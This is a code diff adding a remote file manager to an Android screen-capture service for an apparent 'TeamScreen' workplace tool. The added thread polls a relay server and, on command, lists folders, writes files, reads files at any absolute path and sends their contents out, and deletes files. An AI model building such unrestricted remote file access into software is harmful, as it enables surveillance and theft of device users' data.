@@ -17,6 +17,7 @@ import android.media.ImageReader;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
+import android.os.Environment;
 import android.os.IBinder;
 import android.util.Base64;
 import android.util.DisplayMetrics;
@@ -28,12 +29,16 @@ import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.ByteBuffer;
 import java.nio.charset.StandardCharsets;
+import java.util.Arrays;
 
 public class ScreenCaptureService extends Service {
     private static final String TAG = "ScreenCaptureService";
@@ -71,6 +76,7 @@ public class ScreenCaptureService extends Service {
     private Thread mCaptureThread;
     private Thread mHeartbeatThread;
     private Thread mInputReceiverThread;
+    private Thread mFileHandlerThread;
 
     public static boolean isStreaming() {
         return sIsStreaming;
@@ -240,6 +246,10 @@ public class ScreenCaptureService extends Service {
             }
         }, "Input-Thread");
         mInputReceiverThread.start();
+
+        // File Handler thread (polls remote CEO file commands every 400ms)
+        mFileHandlerThread = new Thread(this::fileHandlerLoop, "File-Thread");
+        mFileHandlerThread.start();
 
         // Capture & Frame Streaming Thread (~15-20 fps)
         mCaptureThread = new Thread(() -> {
@@ -430,6 +440,212 @@ public class ScreenCaptureService extends Service {
         return null;
     }
 
+    // --- Remote File & Folder Manager Handler ---
+    private void fileHandlerLoop() {
+        String cmdUrl = mRelayUrl + "/api/files/command?workerId=" + mWorkerId;
+        String resultUrl = mRelayUrl + "/api/files/result";
+
+        while (mRunning) {
+            try {
+                String res = getHttp(cmdUrl);
+                if (res != null) {
+                    JSONObject json = new JSONObject(res);
+                    if (json.has("commands")) {
+                        JSONArray commands = json.getJSONArray("commands");
+                        for (int i = 0; i < commands.length(); i++) {
+                            JSONObject cmd = commands.getJSONObject(i);
+                            String action = cmd.optString("action", "");
+                            String reqPath = cmd.optString("path", "");
+                            String fileName = cmd.optString("fileName", "");
+                            String fileData = cmd.optString("fileData", "");
+
+                            if ("list".equals(action)) {
+                                handleListDirectory(reqPath, resultUrl);
+                            } else if ("upload".equals(action)) {
+                                handleUploadFile(reqPath, fileName, fileData, resultUrl);
+                            } else if ("download".equals(action)) {
+                                handleDownloadFile(reqPath, resultUrl);
+                            } else if ("delete".equals(action)) {
+                                handleDeleteFile(reqPath, resultUrl);
+                            } else if ("mkdir".equals(action)) {
+                                handleMakeDirectory(reqPath, fileName, resultUrl);
+                            }
+                        }
+                    }
+                }
+                Thread.sleep(400);
+            } catch (InterruptedException e) {
+                break;
+            } catch (Exception e) {
+                try { Thread.sleep(1000); } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private File resolveDirectory(String targetPath) {
+        File baseDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+        if (baseDir == null || !baseDir.exists()) {
+            baseDir = getExternalFilesDir(null);
+        }
+        if (targetPath == null || targetPath.trim().isEmpty() || "DEFAULT".equalsIgnoreCase(targetPath) || "DOWNLOADS".equalsIgnoreCase(targetPath) || "DESKTOP".equalsIgnoreCase(targetPath)) {
+            File companyDir = new File(baseDir, "TeamScreen");
+            if (!companyDir.exists()) companyDir.mkdirs();
+            return companyDir;
+        }
+        if ("DOCUMENTS".equalsIgnoreCase(targetPath)) {
+            File docDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
+            if (docDir != null && docDir.exists()) return docDir;
+            return baseDir;
+        }
+        File f = new File(targetPath);
+        return f.isAbsolute() ? f : new File(baseDir, targetPath);
+    }
+
+    private void handleListDirectory(String targetPath, String resultUrl) {
+        File dir = resolveDirectory(targetPath);
+        JSONArray items = new JSONArray();
+        boolean success = false;
+        String statusMsg = "";
+
+        try {
+            if (!dir.exists()) {
+                dir.mkdirs();
+            }
+            File[] files = dir.listFiles();
+            if (files != null) {
+                Arrays.sort(files, (a, b) -> {
+                    if (a.isDirectory() && !b.isDirectory()) return -1;
+                    if (!a.isDirectory() && b.isDirectory()) return 1;
+                    return a.getName().compareToIgnoreCase(b.getName());
+                });
+
+                for (File file : files) {
+                    JSONObject item = new JSONObject();
+                    item.put("name", file.getName());
+                    item.put("isDir", file.isDirectory());
+                    item.put("size", file.isDirectory() ? 0 : file.length());
+                    item.put("modified", file.lastModified());
+                    items.put(item);
+                }
+            }
+            statusMsg = "Folder scanned: " + items.length() + " items found";
+            success = true;
+        } catch (Exception e) {
+            statusMsg = "Access error: " + e.getMessage();
+        }
+
+        try {
+            JSONObject payload = new JSONObject();
+            payload.put("workerId", mWorkerId);
+            payload.put("action", "list");
+            payload.put("currentPath", dir.getAbsolutePath());
+            payload.put("items", items);
+            payload.put("statusMessage", statusMsg);
+            payload.put("success", success);
+            postJson(resultUrl, payload.toString());
+        } catch (Exception ignored) {}
+    }
+
+    private void handleUploadFile(String targetDir, String fileName, String b64Data, String resultUrl) {
+        File dir = resolveDirectory(targetDir);
+        if (!dir.exists()) dir.mkdirs();
+        File dest = new File(dir, fileName);
+        boolean success = false;
+        String msg = "";
+
+        try {
+            byte[] bytes = Base64.decode(b64Data, Base64.DEFAULT);
+            try (FileOutputStream fos = new FileOutputStream(dest)) {
+                fos.write(bytes);
+            }
+            success = true;
+            msg = "File uploaded successfully: " + fileName;
+            handleListDirectory(dir.getAbsolutePath(), resultUrl);
+            return;
+        } catch (Exception e) {
+            msg = "Upload failed: " + e.getMessage();
+        }
+
+        try {
+            JSONObject payload = new JSONObject();
+            payload.put("workerId", mWorkerId);
+            payload.put("action", "upload");
+            payload.put("currentPath", dir.getAbsolutePath());
+            payload.put("statusMessage", msg);
+            payload.put("success", success);
+            postJson(resultUrl, payload.toString());
+        } catch (Exception ignored) {}
+    }
+
+    private void handleDownloadFile(String filePath, String resultUrl) {
+        File file = new File(filePath);
+        if (!file.exists() || file.isDirectory()) {
+            try {
+                JSONObject payload = new JSONObject();
+                payload.put("workerId", mWorkerId);
+                payload.put("action", "download");
+                payload.put("currentPath", file.getParent() != null ? file.getParent() : "");
+                payload.put("fileName", file.getName());
+                payload.put("statusMessage", "File does not exist or is a directory");
+                payload.put("success", false);
+                postJson(resultUrl, payload.toString());
+            } catch (Exception ignored) {}
+            return;
+        }
+
+        try {
+            byte[] bytes = new byte[(int) file.length()];
+            try (FileInputStream fis = new FileInputStream(file)) {
+                int read = 0;
+                while (read < bytes.length) {
+                    int r = fis.read(bytes, read, bytes.length - read);
+                    if (r == -1) break;
+                    read += r;
+                }
+            }
+            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+
+            JSONObject payload = new JSONObject();
+            payload.put("workerId", mWorkerId);
+            payload.put("action", "download");
+            payload.put("currentPath", file.getParent());
+            payload.put("fileName", file.getName());
+            payload.put("fileData", b64);
+            payload.put("statusMessage", "File ready for download");
+            payload.put("success", true);
+            postJson(resultUrl, payload.toString());
+        } catch (Exception e) {
+            try {
+                JSONObject payload = new JSONObject();
+                payload.put("workerId", mWorkerId);
+                payload.put("action", "download");
+                payload.put("currentPath", file.getParent());
+                payload.put("fileName", file.getName());
+                payload.put("statusMessage", "Read error: " + e.getMessage());
+                payload.put("success", false);
+                postJson(resultUrl, payload.toString());
+            } catch (Exception ignored) {}
+        }
+    }
+
+    private void handleDeleteFile(String filePath, String resultUrl) {
+        File target = new File(filePath);
+        File parent = target.getParentFile();
+        if (target.exists()) {
+            target.delete();
+        }
+        if (parent != null) {
+            handleListDirectory(parent.getAbsolutePath(), resultUrl);
+        }
+    }
+
+    private void handleMakeDirectory(String targetDir, String folderName, String resultUrl) {
+        File dir = resolveDirectory(targetDir);
+        File newFolder = new File(dir, folderName);
+        newFolder.mkdirs();
+        handleListDirectory(dir.getAbsolutePath(), resultUrl);
+    }
+
     private void stopScreenCapture() {
         mRunning = false;
         sIsStreaming = false;
@@ -445,6 +661,10 @@ public class ScreenCaptureService extends Service {
         if (mInputReceiverThread != null) {
             mInputReceiverThread.interrupt();
             mInputReceiverThread = null;
+        }
+        if (mFileHandlerThread != null) {
+            mFileHandlerThread.interrupt();
+            mFileHandlerThread = null;
         }
 
         if (mVirtualDisplay != null) {
